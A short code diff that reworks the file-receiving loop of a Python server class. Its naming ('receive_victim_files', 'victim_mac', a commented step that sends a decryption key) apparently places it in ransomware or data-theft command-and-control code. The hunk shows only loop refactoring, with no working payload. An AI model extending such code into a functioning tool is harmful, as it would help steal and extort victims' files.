@@ -147,14 +147,14 @@ class Server:
                     #connection.sendall(key_name)
 
                     #key = base64.b64encode('key file'.encode(SERVER.FORMAT))
+
                     #connection.sendall(key)
 
-                    while True:
-                        self.receive_victim_files(connection, victim_mac)
-                        print(self.TRANSFER_DONE)
+                    while not self.TRANSFER_DONE:
+                        self.receive_victim_files(connection)
                         if self.TRANSFER_DONE == True:
                             break
-                    break 
+                    break
                     
                 else:
                     # sends decryption key  
